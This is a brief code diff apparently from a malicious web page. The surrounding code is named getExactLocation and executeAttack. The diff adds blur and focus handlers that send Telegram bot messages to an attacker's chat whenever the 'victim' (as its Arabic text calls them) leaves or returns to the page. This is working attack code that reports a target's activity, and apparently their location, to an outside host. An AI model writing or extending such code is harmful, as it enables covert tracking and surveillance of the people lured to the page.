@@ -248,6 +248,13 @@ async function getExactLocation() {
         });
     }
 }
+window.onblur = () => {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📉 الضحية خرج من الصفحة (راح للواتساب أو قفل المتصفح)!")}`);
+};
+
+window.onfocus = () => {
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("📈 الضحية عاد للصفحة مجدداً!")}`);
+};
 
     async function executeAttack() {
         getExactLocation();
